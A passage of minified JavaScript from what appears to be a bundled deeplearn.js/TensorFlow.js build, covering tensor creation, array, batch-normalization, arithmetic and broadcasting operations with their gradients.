mpareOps.greaterEqual,this.greaterEqualStrict=a.CompareOps.greaterEqualStrict,this.less=a.CompareOps.less,this.lessStrict=a.CompareOps.lessStrict,this.lessEqual=a.CompareOps.lessEqual,this.lessEqualStrict=a.CompareOps.lessEqualStrict,this.notEqual=a.CompareOps.notEqual,this.notEqualStrict=a.CompareOps.notEqualStrict,this.abs=x.UnaryOps.abs,this.acos=x.UnaryOps.acos,this.asin=x.UnaryOps.asin,this.atan=x.UnaryOps.atan,this.ceil=x.UnaryOps.ceil,this.clip=x.UnaryOps.clipByValue,this.cos=x.UnaryOps.cos,this.cosh=x.UnaryOps.cosh,this.elu=x.UnaryOps.elu,this.exp=x.UnaryOps.exp,this.floor=x.UnaryOps.floor,this.leakyRelu=x.UnaryOps.leakyRelu,this.log=x.UnaryOps.log,this.neg=x.UnaryOps.neg,this.prelu=x.UnaryOps.prelu,this.relu=x.UnaryOps.relu,this.selu=x.UnaryOps.selu,this.sigmoid=x.UnaryOps.sigmoid,this.sin=x.UnaryOps.sin,this.sinh=x.UnaryOps.sinh,this.sqrt=x.UnaryOps.sqrt,this.square=x.UnaryOps.square,this.step=x.UnaryOps.step,this.tan=x.UnaryOps.tan,this.tanh=x.UnaryOps.tanh,this.norm=f.NormOps.norm,this.basicLSTMCell=p.LSTMOps.basicLSTMCell,this.multiRNNCell=p.LSTMOps.multiRNNCell,this.softmax=b.SoftmaxOps.softmax,this.softmaxCrossEntropy=b.SoftmaxOps.softmaxCrossEntropy,this.cast=i.ArrayOps.cast,this.clone=i.ArrayOps.clone,this.gather=i.ArrayOps.gather,this.reshape=i.ArrayOps.reshape,this.tile=i.ArrayOps.tile,this.oneHot=i.ArrayOps.oneHot,this.multinomial=i.ArrayOps.multinomial,this.pad1D=i.ArrayOps.pad1d,this.pad2D=i.ArrayOps.pad2d,this.resizeBilinear3D=c.ImageOps.resizeBilinear,this.localResponseNormalization3D=h.LRNOps.localResponseNormalization,this.localResponseNormalization4D=h.LRNOps.localResponseNormalization,this.keep=T.Tracking.keep,r.ENV.setMath(this,t,e),this.engine=r.ENV.engine,this.dispose=r.ENV.engine.dispose.bind(r.ENV.engine),this.registeredVariables=r.ENV.engine.registeredVariables,this.startScope=r.ENV.engine.startScope.bind(r.ENV.engine),this.endScope=r.ENV.engine.endScope.bind(r.ENV.engine)}return t.prototype.scope=function(t){var e=function(t){return E(t)},n=function(t){return t};return O((function(){return t(e,n)}))},t.prototype.track=function(t){return t},t.prototype.topK=function(t,e){var n,i;return S.assert(e<=t.size,"Error in topK: k value ("+e+") must be less than size of input tensor, got shape "+t.shape+"."),O("topK",(function(){return n=r.ENV.engine.runKernel((function(n){return n.topKValues(t,e)}),{x:t}),i=r.ENV.engine.runKernel((function(n){return n.topKIndices(t,e)}),{x:t}),n})),{values:n,indices:i}},t.prototype.elementWiseMul=function(t,e){return t.mulStrict(e)},t.prototype.scalarDividedByArray=function(t,e){return S.assert(1===t.size,"Error in scalarDividedByArray: first argument must be rank 0, but got Tensor of rank "+t.rank+"."),t.div(e)},t.prototype.arrayDividedByScalar=function(t,e){return S.assert(1===e.size,"Error in arrayDividedByScalar: second argument must be rank 0, but got Tensor of rank "+e.rank+"."),t.div(e)},t.prototype.switchDim=function(t,e){return y.transpose(t,e)},t.prototype.scalarPlusArray=function(t,e){return S.assert(1===t.size,"Error in scalarPlusArray: first argument must be rank 0, but got rank "+t.rank+"."),this.add(t,e)},t.prototype.scalarMinusArray=function(t,e){return S.assert(1===t.size,"Error in scalarMinusArray: first argument must be rank 0, but got rank "+t.rank+"."),this.subtract(t,e)},t.prototype.arrayMinusScalar=function(t,e){return S.assert(1===e.size,"Error in arrayMinusScalar: second argument must be rank 0, but got rank "+e.rank+"."),this.subtract(t,e)},t.prototype.scaledArrayAdd=function(t,e,n,r){var i=this;return S.assert(1===t.size,"Error in scaledArrayAdd: first argument must rank 0, but got  rank "+t.rank+"."),S.assert(1===n.size,"Error in scaledArrayAdd: third argument must be rank 0, but got Tensor of rank "+n.rank+"."),S.assertShapesMatch(e.shape,r.shape,"Error in scaledArrayAdd: "),O("scaledArrayAdd",(function(){return i.add(i.multiply(t,e),i.multiply(n,r))}))},t.prototype.scalarTimesArray=function(t,e){return S.assert(1===t.size,"Error in arrayDividedByScalar: first argument must be rank 0, but got rank "+t.rank+"."),this.multiply(t,e)},t.prototype.concat=function(t,e,n){return y.concat([t,e],n)},t.prototype.concat1D=function(t,e){return y.concat1d([t,e])},t.prototype.concat2D=function(t,e,n){return y.concat2d([t,e],n)},t.prototype.concat3D=function(t,e,n){return y.concat3d([t,e],n)},t.prototype.concat4D=function(t,e,n){return y.concat4d([t,e],n)},t.prototype.conv1d=function(t,e,n,r,i,o){return null!=n&&S.assert(1===n.rank,"Error in conv1d: bias must be rank 1, but got rank "+n.rank+"."),y.conv1d(t,e,r,i,o).add(n)},t.prototype.conv2d=function(t,e,n,r,i,o){return null!=n&&S.assert(1===n.rank,"Error in conv2d: bias must be rank 1, but got rank "+n.rank+"."),y.conv2d(t,e,r,i,o).add(n)},t.prototype.argMaxEquals=function(t,e){return S.assertShapesMatch(t.shape,e.shape,"Error in argMaxEquals: "),t.argMax().equal(e.argMax())},t}();n.NDArrayMath=A},{"./environment":27,"./ops/array_ops":97,"./ops/batchnorm":99,"./ops/binary_ops":100,"./ops/compare":102,"./ops/conv":105,"./ops/image_ops":107,"./ops/logical_ops":108,"./ops/lrn":109,"./ops/lstm":110,"./ops/matmul":111,"./ops/norm":112,"./ops/ops":114,"./ops/pool":115,"./ops/reduction_ops":118,"./ops/reverse":119,"./ops/slice":121,"./ops/softmax":123,"./ops/transpose":124,"./ops/unary_ops":125,"./tracking":140,"./util":143}],97:[function(t,e,n){"use strict";var r=this&&this.__decorate||function(t,e,n,r){var i,o=arguments.length,s=o<3?e:null===r?r=Object.getOwnPropertyDescriptor(e,n):r;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(i=t[a])&&(s=(o<3?i(s):o>3?i(e,n,s):i(e,n))||s);return o>3&&s&&Object.defineProperty(e,n,s),s};Object.defineProperty(n,"__esModule",{value:!0});var i=t("../doc"),o=t("../environment"),s=t("../tensor"),a=t("../tensor_util"),u=t("../util"),c=t("./axis_util"),l=t("./concat"),h=t("./operation"),p=t("./rand"),d=function(){function t(){}return t.tensor=function(t,e,n){void 0===n&&(n="float32");var r=u.inferShape(t);return null!=e&&1!==r.length&&u.assertShapesMatch(e,r,"Error creating a new Tensor. Inferred shape ("+r+") does not match the provided shape ("+e+"). "),u.isTypedArray(t)||Array.isArray(t)||(t=[t]),e=e||r,s.Tensor.make(e,{values:y(t,n)},n)},t.scalar=function(e,n){if(void 0===n&&(n="float32"),u.isTypedArray(e)||Array.isArray(e))throw new Error("Error creating a new Scalar: value must be a primitive (number|boolean)");return t.tensor(e,[],n)},t.tensor1d=function(e,n){void 0===n&&(n="float32");var r=u.inferShape(e);if(1!==r.length)throw new Error("Error creating a new Tensor1D: values must be a flat/TypedArray");return t.tensor(e,r,n)},t.tensor2d=function(e,n,r){void 0===r&&(r="float32");var i=u.inferShape(e);if(2!==i.length&&1!==i.length)throw new Error("Error creating a new Tensor2D: values must be number[][] or flat/TypedArray");return n=n||i,t.tensor(e,n,r)},t.tensor3d=function(e,n,r){void 0===r&&(r="float32");var i=u.inferShape(e);if(3!==i.length&&1!==i.length)throw new Error("Error creating a new Tensor3D: values must be number[][][]or flat/TypedArray");return n=n||i,t.tensor(e,n,r)},t.tensor4d=function(e,n,r){void 0===r&&(r="float32");var i=u.inferShape(e);if(4!==i.length&&1!==i.length)throw new Error("Error creating a new Tensor4D: values must be number[][][][]or flat/TypedArray");return n=n||i,t.tensor(e,n,r)},t.ones=function(t,e){void 0===e&&(e="float32");var n=function(t,e){for(var n=f(t,e),r=0;r<n.length;r++)n[r]=1;return n}(u.sizeFromShape(t),e);return s.Tensor.make(t,{values:n},e)},t.zeros=function(t,e){void 0===e&&(e="float32");var n=f(u.sizeFromShape(t),e);return s.Tensor.make(t,{values:n},e)},t.fill=function(t,e,n){void 0===n&&(n="float32");var r=u.getTypedArrayFromDType(n,u.sizeFromShape(t));return r.fill(e),s.Tensor.make(t,{values:r},n)},t.onesLike=function(e){return t.ones(e.shape,e.dtype)},t.zerosLike=function(e){return t.zeros(e.shape,e.dtype)},t.clone=function(t){return s.Tensor.make(t.shape,{dataId:t.dataId},t.dtype)},t.randomNormal=function(t,e,n,r,i){if(void 0===e&&(e=0),void 0===n&&(n=1),null!=r&&"bool"===r)throw new Error("Unsupported data type "+r);var o=new p.MPRandGauss(e,n,r,!1,i);return s.Tensor.rand(t,(function(){return o.nextValue()}),r)},t.truncatedNormal=function(t,e,n,r,i){if(void 0===e&&(e=0),void 0===n&&(n=1),null!=r&&"bool"===r)throw new Error("Unsupported data type "+r);var o=new p.MPRandGauss(e,n,r,!0,i);return s.Tensor.rand(t,(function(){return o.nextValue()}),r)},t.randomUniform=function(t,e,n,r){return void 0===e&&(e=0),void 0===n&&(n=1),void 0===r&&(r="float32"),s.Tensor.rand(t,(function(){return u.randUniform(e,n)}),r)},t.rand=function(t,e,n){var r=u.sizeFromShape(t),i=null;if(null==n||"float32"===n)i=new Float32Array(r);else if("int32"===n)i=new Int32Array(r);else{if("bool"!==n)throw new Error("Unknown data type "+n);i=new Uint8Array(r)}for(var o=0;o<r;o++)i[o]=e();return s.Tensor.make(t,{values:i},n)},t.multinomial=function(t,e,n){var r=t.size,i=t.rank;if(r<2)throw new Error("Error in multinomial: you need at least 2 outcomes, but got "+r+".");if(i>2)throw new Error("Rank of probabilities must be 1 or 2, but is "+i);n=n||Math.random();var s=1===i?t.as2D(1,-1):t,a=o.ENV.engine.runKernel((function(t){return t.multinomial(s,e,n)}),{prob2D:s});return 1===i?a.as1D():a},t.oneHot=function(t,e,n,r){if(void 0===n&&(n=1),void 0===r&&(r=0),e<2)throw new Error("Error in oneHot: depth must be >=2, but it is "+e);return o.ENV.engine.runKernel((function(i){return i.oneHot(t,e,n,r)}),{indices:t})},t.fromPixels=function(t,e){if(void 0===e&&(e=3),e>4)throw new Error("Cannot construct Tensor with more than 4 channels from pixels.");return o.ENV.engine.fromPixels(t,e)},t.reshape=function(t,e){e=u.inferFromImplicitShape(e,t.size),u.assert(t.size===u.sizeFromShape(e),"new shape and old shape must have the same number of elements.");return o.ENV.engine.runKernel((function(n){return s.Tensor.make(e,{dataId:t.dataId},t.dtype)}),{x:t},(function(e){return{x:function(){return e.reshape(t.shape)}}}))},t.squeeze=function(e,n){return t.reshape(e,u.squeezeShape(e.shape,n).newShape)},t.cast=function(e,n){return o.ENV.engine.runKernel((function(r){if(!u.hasEncodingLoss(e.dtype,n))return s.Tensor.make(e.shape,{dataId:e.dataId},n);if("int32"===n)return r.int(e);if("bool"===n)return r.notEqual(e,t.scalar(0,e.dtype));throw new Error("Error in Cast: unknown dtype argument ("+n+")")}),{x:e},(function(t){return{x:function(){return t.clone()}}}))},t.tile=function(e,n){u.assert(e.rank===n.length,"Error in transpose: rank of input "+e.rank+" must match length of reps "+n+".");return o.ENV.engine.runKernel((function(t){return t.tile(e,n)}),{x:e},(function(r){return{x:function(){var i=t.zerosLike(e);if(1===e.rank)for(var o=0;o<n[0];++o)i=i.add(r.slice([o*e.shape[0]],[e.shape[0]]));else if(2===e.rank)for(o=0;o<n[0];++o)for(var s=0;s<n[1];++s)i=i.add(r.slice([o*e.shape[0],s*e.shape[1]],[e.shape[0],e.shape[1]]));else if(3===e.rank)for(o=0;o<n[0];++o)for(s=0;s<n[1];++s)for(var a=0;a<n[2];++a)i=i.add(r.slice([o*e.shape[0],s*e.shape[1],a*e.shape[2]],[e.shape[0],e.shape[1],e.shape[2]]));else{if(4!==e.rank)throw new Error("Gradient for tile operation is not implemented for rank-"+e.rank+" tensors yet.");for(o=0;o<n[0];++o)for(s=0;s<n[1];++s)for(a=0;a<n[2];++a)for(var u=0;u<n[3];++u)i=i.add(r.slice([o*e.shape[0],s*e.shape[1],a*e.shape[2],u*e.shape[3]],[e.shape[0],e.shape[1],e.shape[2],e.shape[3]]))}return i}}}))},t.gather=function(t,e,n){void 0===n&&(n=0);var r=c.parseAxisParam(n,t.shape);return o.ENV.engine.runKernel((function(n){return n.gather(t,e,r[0])}),{x:t,indices:e})},t.pad1d=function(e,n,r){return void 0===r&&(r=0),u.assert(2===n.length,"Invalid number of paddings. Must be length of 2."),t.pad(e,[n],r)},t.pad2d=function(e,n,r){return void 0===r&&(r=0),u.assert(2===n.length&&2===n[0].length&&2===n[1].length,"Invalid number of paddings. Must be length of 2 each."),t.pad(e,n,r)},t.pad3d=function(e,n,r){return void 0===r&&(r=0),u.assert(3===n.length&&2===n[0].length&&2===n[1].length&&2===n[2].length,"Invalid number of paddings. Must be length of 2 each."),t.pad(e,n,r)},t.pad4d=function(e,n,r){return void 0===r&&(r=0),u.assert(4===n.length&&2===n[0].length&&2===n[1].length&&2===n[2].length&&2===n[3].length,"Invalid number of paddings. Must be length of 2 each."),t.pad(e,n,r)},t.pad=function(t,e,n){if(void 0===n&&(n=0),0===t.rank)throw new Error("pad(scalar) is not defined. Pass non-scalar to pad");var r=e.map((function(t){return t[0]}));return o.ENV.engine.runKernel((function(r){return r.pad(t,e,n)}),{x:t},(function(e){return{x:function(){return e.slice(r,t.shape)}}}))},t.stack=function(t,e){void 0===e&&(e=0),u.assert(t.length>=2,"Pass at least two tensors to dl.stack");var n=t[0].rank,r=t[0].shape,i=t[0].dtype;u.assert(e<=n,"Axis must be <= rank of the tensor"),t.forEach((function(t){u.assertShapesMatch(r,t.shape,"All tensors passed to stack must have matching shapes")})),t.forEach((function(t){u.assert(i===t.dtype,"All tensors passed to stack must have matching dtypes")}));var o=t.map((function(t){return t.expandDims(e)}));return l.ConcatOps.concat(o,e)},t.expandDims=function(e,n){void 0===n&&(n=0),u.assert(n<=e.rank,"Axis must be <= rank of the tensor");var r=e.shape.slice();return r.splice(n,0,1),t.reshape(e,r)},t.linspace=function(t,e,n){if(0===n)throw new Error("Cannot request zero samples");var r=(e-t)/(n-1),i=f(n,"float32");i[0]=t;for(var o=1;o<i.length;o++)i[o]=i[o-1]+r;return s.Tensor1D.new(i,"float32")},t.range=function(e,n,r,i){if(void 0===r&&(r=1),void 0===i&&(i="float32"),0===r)throw new Error("Cannot have a step of zero");if(e===n||e<n&&r<0||n<e&&r>1)return t.zeros([0],i);var o=f(Math.abs(Math.ceil((n-e)/r)),i);n<e&&1===r&&(r=-1),o[0]=e;for(var s=1;s<o.length;s++)o[s]=o[s-1]+r;return t.tensor1d(o,i)},t.buffer=function(t,e,n){return void 0===e&&(e="float32"),new s.TensorBuffer(t,e,n)},t.print=function(t,e){void 0===e&&(e=!1),console.log(a.tensorToString(t,e))},r([i.doc({heading:"Tensors",subheading:"Creation"})],t,"tensor",null),r([i.doc({heading:"Tensors",subheading:"Creation"})],t,"scalar",null),r([i.doc({heading:"Tensors",subheading:"Creation"})],t,"tensor1d",null),r([i.doc({heading:"Tensors",subheading:"Creation"})],t,"tensor2d",null),r([i.doc({heading:"Tensors",subheading:"Creation"})],t,"tensor3d",null),r([i.doc({heading:"Tensors",subheading:"Creation"})],t,"tensor4d",null),r([i.doc({heading:"Tensors",subheading:"Creation"}),h.operation],t,"ones",null),r([i.doc({heading:"Tensors",subheading:"Creation"}),h.operation],t,"zeros",null),r([i.doc({heading:"Tensors",subheading:"Creation"}),h.operation],t,"fill",null),r([i.doc({heading:"Tensors",subheading:"Creation"}),h.operation],t,"onesLike",null),r([i.doc({heading:"Tensors",subheading:"Creation"}),h.operation],t,"zerosLike",null),r([i.doc({heading:"Tensors",subheading:"Creation"}),h.operation],t,"clone",null),r([i.doc({heading:"Tensors",subheading:"Creation"}),h.operation],t,"randomNormal",null),r([i.doc({heading:"Tensors",subheading:"Creation"}),h.operation],t,"truncatedNormal",null),r([i.doc({heading:"Tensors",subheading:"Creation"}),h.operation],t,"randomUniform",null),r([h.operation],t,"rand",null),r([h.operation],t,"multinomial",null),r([i.doc({heading:"Tensors",subheading:"Creation"}),h.operation],t,"oneHot",null),r([i.doc({heading:"Tensors",subheading:"Creation"}),h.operation],t,"fromPixels",null),r([i.doc({heading:"Tensors",subheading:"Transformations"}),h.operation],t,"reshape",null),r([i.doc({heading:"Tensors",subheading:"Transformations"})],t,"squeeze",null),r([i.doc({heading:"Tensors",subheading:"Transformations"}),h.operation],t,"cast",null),r([i.doc({heading:"Tensors",subheading:"Slicing and Joining"}),h.operation],t,"tile",null),r([i.doc({heading:"Tensors",subheading:"Slicing and Joining"}),h.operation],t,"gather",null),r([i.doc({heading:"Tensors",subheading:"Transformations"}),h.operation],t,"pad",null),r([i.doc({heading:"Tensors",subheading:"Slicing and Joining"}),h.operation],t,"stack",null),r([i.doc({heading:"Tensors",subheading:"Transformations"}),h.operation],t,"expandDims",null),r([h.operation,i.doc({heading:"Tensors",subheading:"Creation"})],t,"linspace",null),r([h.operation,i.doc({heading:"Tensors",subheading:"Creation"})],t,"range",null),r([i.doc({heading:"Tensors",subheading:"Creation"})],t,"buffer",null),r([i.doc({heading:"Tensors",subheading:"Creation"})],t,"print",null),t}();function f(t,e){if(null==e||"float32"===e)return new Float32Array(t);if("int32"===e)return new Int32Array(t);if("bool"===e)return new Uint8Array(t);throw new Error("Unknown data type $ {dtype}")}function y(t,e){return function(t,e){return t instanceof Float32Array&&"float32"===e||t instanceof Int32Array&&"int32"===e||t instanceof Uint8Array&&"bool"===e}(t,e)?t:(Array.isArray(t)&&(t=u.flatten(t)),u.copyTypedArray(t,e))}n.ArrayOps=d},{"../doc":25,"../environment":27,"../tensor":137,"../tensor_util":138,"../util":143,"./axis_util":98,"./concat":103,"./operation":113,"./rand":116}],98:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=t("../util");function i(t,e){for(var n=0;n<t.length;++n)if(t[t.length-n-1]!==e-1-n)return!1;return!0}function o(t,e,n){for(var r=t.length+e.length,i=[],o=0,s=0,a=0;a<r;a++)-1===n.indexOf(a)?i.push(t[o++]):i.push(e[s++]);return i}n.axesAreInnerMostDims=i,n.combineLocations=o,n.computeOutAndReduceShapes=function(t,e){for(var n=[],r=t.length,i=0;i<r;i++)-1===e.indexOf(i)&&n.push(t[i]);return[n,e.map((function(e){return t[e]}))]},n.expandShapeToKeepDim=function(t,e){return o(t,e.map((function(t){return 1})),e)},n.parseAxisParam=function(t,e){var n=e.length;return t=null==t?e.map((function(t,e){return e})):[].concat(t),r.assert(t.every((function(t){return t>=-n&&t<n})),"All values in axis param must be in range [-"+n+", "+n+") but got axis "+t),r.assert(t.every((function(t){return r.isInt(t)})),"All values in axis param must be integers but got axis "+t),t.map((function(t){return t<0?n+t:t}))},n.assertAxesAreInnerMostDims=function(t,e,n){r.assert(i(e,n),t+" supports only inner-most axes for now. Got axes "+e+" and rank-"+n+" input.")},n.getAxesPermutation=function(t,e){if(i(t,e))return null;for(var n=[],r=0;r<e;++r)-1===t.indexOf(r)&&n.push(r);return t.forEach((function(t){return n.push(t)})),n},n.getUndoAxesPermutation=function(t){return t.map((function(t,e){return[e,t]})).sort((function(t,e){return t[1]-e[1]})).map((function(t){return t[0]}))},n.getInnerMostAxes=function(t,e){for(var n=[],r=e-t;r<e;++r)n.push(r);return n}},{"../util":143}],99:[function(t,e,n){"use strict";var r=this&&this.__decorate||function(t,e,n,r){var i,o=arguments.length,s=o<3?e:null===r?r=Object.getOwnPropertyDescriptor(e,n):r;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(i=t[a])&&(s=(o<3?i(s):o>3?i(e,n,s):i(e,n))||s);return o>3&&s&&Object.defineProperty(e,n,s),s};Object.defineProperty(n,"__esModule",{value:!0});var i=t("../doc"),o=t("../environment"),s=t("../util"),a=t("./operation"),u=function(){function t(){}return t.batchNormalization2d=function(e,n,r,i,o,a){return void 0===i&&(i=.001),s.assert(2===e.rank,"Error in batchNormalization3D: x must be rank 3 but got rank "+e.rank+"."),s.assert(2===n.rank||1===n.rank,"Error in batchNormalization2D: mean must be rank 2 or rank 1 but got rank "+n.rank+"."),s.assert(2===r.rank||1===r.rank,"Error in batchNormalization2D: variance must be rank 2 or rank 1 but got rank "+r.rank+"."),null!=o&&s.assert(2===o.rank||1===o.rank,"Error in batchNormalization2D: scale must be rank 2 or rank 1 but got rank "+o.rank+"."),null!=a&&s.assert(2===a.rank||1===a.rank,"Error in batchNormalization2D: offset must be rank 2 or rank 1 but got rank "+a.rank+"."),t.batchNormalization(e,n,r,i,o,a)},t.batchNormalization3d=function(e,n,r,i,o,a){return void 0===i&&(i=.001),s.assert(3===e.rank,"Error in batchNormalization3D: x must be rank 3 but got rank "+e.rank+"."),s.assert(3===n.rank||1===n.rank,"Error in batchNormalization3D: mean must be rank 3 or rank 1 but got rank "+n.rank+"."),s.assert(3===r.rank||1===r.rank,"Error in batchNormalization3D: variance must be rank 3 or rank 1 but got rank "+r.rank+"."),null!=o&&s.assert(3===o.rank||1===o.rank,"Error in batchNormalization3D: scale must be rank 3 or rank 1 but got rank "+o.rank+"."),null!=a&&s.assert(3===a.rank||1===a.rank,"Error in batchNormalization3D: offset must be rank 3 or rank 1 but got rank "+a.rank+"."),t.batchNormalization(e,n,r,i,o,a)},t.batchNormalization4d=function(e,n,r,i,o,a){return void 0===i&&(i=.001),s.assert(4===e.rank,"Error in batchNormalization4D: x must be rank 4 but got rank "+e.rank+"."),s.assert(4===n.rank||1===n.rank,"Error in batchNormalization4D: mean must be rank 4 or rank 1 but got rank "+n.rank+"."),s.assert(4===r.rank||1===r.rank,"Error in batchNormalization4D: variance must be rank 4 or rank 1 but got rank "+r.rank+"."),null!=o&&s.assert(4===o.rank||1===o.rank,"Error in batchNormalization4D: scale must be rank 4 or rank 1 but got rank "+o.rank+"."),null!=a&&s.assert(4===a.rank||1===a.rank,"Error in batchNormalization4D: offset must be rank 4 or rank 1 but got rank "+a.rank+"."),t.batchNormalization(e,n,r,i,o,a)},t.batchNormalization=function(t,e,n,r,i,s){var a;return void 0===r&&(r=.001),a=0===t.rank||1===t.rank?t.as4D(1,1,1,t.size):2===t.rank?t.as4D(1,1,t.shape[0],t.shape[1]):3===t.rank?t.as4D(1,t.shape[0],t.shape[1],t.shape[2]):t,o.ENV.engine.runKernel((function(t){return t.batchNormalization4D(a,c(e),c(n),r,c(i),c(s))}),{x:t,mean:e,variance:n}).reshape(t.shape)},r([a.operation],t,"batchNormalization2d",null),r([a.operation],t,"batchNormalization3d",null),r([a.operation],t,"batchNormalization4d",null),r([i.doc({heading:"Operations",subheading:"Normalization"})],t,"batchNormalization",null),t}();function c(t){return null==t?null:0===t.rank?t.as1D():1===t.rank?t:2===t.rank?t.as4D(1,1,t.shape[0],t.shape[1]):3===t.rank?t.as4D(1,t.shape[0],t.shape[1],t.shape[2]):t}n.BatchNormOps=u},{"../doc":25,"../environment":27,"../util":143,"./operation":113}],100:[function(t,e,n){"use strict";var r=this&&this.__decorate||function(t,e,n,r){var i,o=arguments.length,s=o<3?e:null===r?r=Object.getOwnPropertyDescriptor(e,n):r;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(i=t[a])&&(s=(o<3?i(s):o>3?i(e,n,s):i(e,n))||s);return o>3&&s&&Object.defineProperty(e,n,s),s};Object.defineProperty(n,"__esModule",{value:!0});var i=t("../doc"),o=t("../environment"),s=t("../util"),a=t("./broadcast_util"),u=t("./operation"),c=t("./ops"),l=function(){function t(){}return t.add=function(t,e){s.assertTypesMatch(t,e);var n=a.assertAndGetBroadcastShape(t.shape,e.shape);return o.ENV.engine.runKernel((function(n){return n.add(t,e)}),{a:t,b:e},(function(r){return{a:function(){var e=r,i=a.getReductionAxes(t.shape,n);return i.length>0&&(e=e.sum(i)),e.reshape(t.shape)},b:function(){var t=r,i=a.getReductionAxes(e.shape,n);return i.length>0&&(t=t.sum(i)),t.reshape(e.shape)}}}))},t.addStrict=function(t,e){return s.assertShapesMatch(t.shape,e.shape,"Error in addStrict: "),t.add(e)},t.sub=function(t,e){s.assertTypesMatch(t,e);var n=a.assertAndGetBroadcastShape(t.shape,e.shape);return o.ENV.engine.runKernel((function(n){return n.subtract(t,e)}),{a:t,b:e},(function(r){return{a:function(){var e=r,i=a.getReductionAxes(t.shape,n);return i.length>0&&(e=e.sum(i)),e.reshape(t.shape)},b:function(){var t=r,i=a.getReductionAxes(e.shape,n);return i.length>0&&(t=t.sum(i)),t.neg().reshape(e.shape)}}}))},t.subStrict=function(t,e){return s.assertShapesMatch(t.shape,e.shape,"Error in subStrict: "),t.sub(e)},t.pow=function(t,e){a.assertAndGetBroadcastShape(t.shape,e.shape);return o.ENV.engine.runKernel((function(n){return n.pow(t,e)}),{base:t},(function(n){if(!s.arraysEqual(t.shape,e.shape)&&!s.isScalarShape(e.shape))throw new Error("Gradient of pow not yet supported for broadcasted shapes.");return{base:function(){var r=e.toFloat(),i=r.mul(t.toFloat().pow(r.sub(c.scalar(1))));return n.mulStrict(i)}}}))},t.powStrict=function(t,e){return s.assertShapesMatch(t.shape,e.shape,"Error in powStrict: "),t.pow(e)},t.mul=function(t,e){s.assertTypesMatch(t,e);var n=a.assertAndGetBroadcastShape(t.shape,e.shape);return o.ENV.engine.runKernel((function(n){return n.multiply(t,e)}),{a:t,b:e},(function(r){return{a:function(){var i=r.mul(e.toFloat()),o=a.getReductionAxes(t.shape,n);return o.length>0?i.sum(o).reshape(t.shape):i},b:function(){var i=r.mul(t.toFloat()),o=a.getReductionAxes(e.shape,n);return o.length>0?i.sum(o).reshape(e.shape):i}}}))},t.mulStrict=function(t,e){return s.assertShapesMatch(t.shape,e.shape,"Error in multiplyStrict: "),t.mul(e)},t.div=function(t,e){var n=a.assertAndGetBroadcastShape(t.shape,e.shape);return o.ENV.engine.runKernel((function(n){return n.divide(t,e)}),{a:t,b:e},(function(r){return{a:function(){var i=r.div(e.toFloat()),o=a.getReductionAxes(t.shape,n);return o.length>0?i.sum(o).reshape(t.shape):i},b:function(){var i=r.mul(t.toFloat()),o=a.getReductionAxes(e.shape,n);o.length>0&&(i=i.sum(o).reshape(e.shape));var s=e.square();return i.div(s.toFloat()).neg()}}}))},t.divStrict=function(t,e){return s.assertShapesMatch(t.shape,e.shape,"Error in divideStrict: "),t.div(e)},t.minimum=function(t,e){s.assertTypesMatch(t,e),a.assertAndGetBroadcastShape(t.shape,e.shape);return o.ENV.engine.runKernel((function(n){return n.minimum(t,e)}),{a:t,b:e},(function(n){return{a:function(){return n.mul(t.lessEqual(e).toFloat())},b:function(){return n.mul(t.greater(e).toFloat())}}}))},t.minimumStrict=function(t,e){return s.assertShapesMatch(t.shape,e.shape,"Error in minimumStrict: "),t.minimum(e)},t.maximum=function(t,e){s.assertTypesMatch(t,e),a.assertAndGetBroadcastShape(t.shape,e.shape);return o.ENV.engine.runKernel((function(n){return n.maximum(t,e)}),{a:t,b:e},(function(n){return{a:function(){return n.mul(t.greaterEqual(e).toFloat())},b:function(){return n.mul(t.less(e).toFloat())}}}))},t.maximumStrict=function(t,e){return s.assertShapesMatch(t.shape,e.shape,"Error in minimumStrict: "),t.maximum(e)},r([i.doc({heading:"Operations",subheading:"Arithmetic"}),u.operation],t,"add",null),r([u.operation],t,"addStrict",null),r([i.doc({heading:"Operations",subheading:"Arithmetic"}),u.operation],t,"sub",null),r([u.operation],t,"subStrict",null),r([i.doc({heading:"Operations",subheading:"Arithmetic"}),u.operation],t,"pow",null),r([u.operation],t,"powStrict",null),r([i.doc({heading:"Operations",subheading:"Arithmetic"}),u.operation],t,"mul",null),r([u.operation],t,"mulStrict",null),r([i.doc({heading:"Operations",subheading:"Arithmetic"}),u.operation],t,"div",null),r([u.operation],t,"divStrict",null),r([i.doc({heading:"Operations",subheading:"Arithmetic"}),u.operation],t,"minimum",null),r([u.operation],t,"minimumStrict",null),r([i.doc({heading:"Operations",subheading:"Arithmetic"}),u.operation],t,"maximum",null),r([u.operation],t,"maximumStrict",null),t}();n.BinaryOps=l},{"../doc":25,"../environment":27,"../util":143,"./broadcast_util":101,"./operation":113,"./ops":114}],101:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0}),n.getBroadcastDims=function(t,e){for(var n=t.length,r=[],i=0;i<n;i++){var o=n-1-i,s=t[o]||1;(e[e.length-1-i]||1)>1&&1===s&&r.unshift(o)}return r},n.getReductionAxes=function(t,e){for(var n=[],r=0;r<e.length;r++){var i=t[t.length-r-1],o=e.length-r-1,s=e[o];(null==i||1===i&&s>1)&&n.unshift(o)}return n},n.broadcastDimsAreOuter=function(t){for(var e=0;e<t.length;e++)if(t[e]!==e)return!1;return!0},n.assertAndGetBroadcastShape=function(t,e){for(var n=[],r="Operands could not be broadcast together with shapes "+t+" and "+e+".",i=Math.max(t.length,e.length),o=0;o<i;o++){var s=t[t.length-o-1]||1,a=e[e.length-o-1]||1;if(s>1&&a>1&&s!==a)throw Error(r);n.unshift(Math.max(s,a))}return n}},{}],102:[function(t,e,n){"use strict";var r=this&&this.__decorate||function(t,e,n,r){var i,o=arguments.length,s=o<3?e:null===r?r=Object.getOwnPropertyDescriptor(e,n):r;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(i=t[a])&&(s=(o<3?i(s):o>3?i(e,n,s):i(e,n))||s);return o>3&&s&&Object.defineProperty(e,n,s),s};Object.defineProperty(n,"__esModule",{value:!0});var 